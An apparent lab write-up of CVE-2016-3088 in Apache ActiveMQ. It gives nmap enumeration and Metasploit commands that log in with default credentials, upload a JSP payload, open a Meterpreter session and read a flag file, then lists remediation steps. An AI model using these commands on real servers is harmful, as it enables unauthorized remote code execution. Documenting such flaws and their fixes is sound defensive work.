# Apache ActiveMQ Fileserver Remote Code Execution

## Summary

| Field | Detail |
|-------|--------|
| **CVE** | CVE-2016-3088 |
| **Affected Version** | Apache ActiveMQ < 5.14.0 |
| **Attack Vector** | Network (HTTP PUT) |
| **Impact** | Remote Code Execution |

## Description

Apache ActiveMQ versions prior to 5.14.0 contain a vulnerability in the Fileserver web application. Improper validation of file paths allows an unauthenticated attacker to upload arbitrary files via HTTP PUT requests. By uploading a malicious JSP file to a web-accessible directory, the attacker achieves remote code execution with the privileges of the ActiveMQ service.

## Enumeration

```bash
nmap -sV -sC TARGET_IP
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.4p1 Debian |

> ActiveMQ's web console (port 8161) was not detected by the default scan. A full port scan (`-p-`) is recommended when default results seem incomplete.

## Exploitation

**Module:** `exploit/multi/http/apache_activemq_upload_jsp`

```bash
msf6 > use exploit/multi/http/apache_activemq_upload_jsp
msf6 > set RHOSTS TARGET_IP
msf6 > run
```

The module authenticates with default credentials (`admin:admin`), uploads a JSP payload to the Fileserver endpoint, and returns a Meterpreter session. Uploaded artifacts are automatically cleaned up after session establishment.

**Post-exploitation:**

```bash
meterpreter > cat /secret.txt
```

## Remediation

| Action | Priority |
|--------|----------|
| Update to ActiveMQ >= 5.14.0 | Critical |
| Change default credentials | Critical |
| Disable Fileserver web application | High |
| Restrict network access to port 8161 | High |

## References

- [CVE-2016-3088 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2016-3088)
- [Apache ActiveMQ Security Advisory](https://activemq.apache.org/security-advisories)
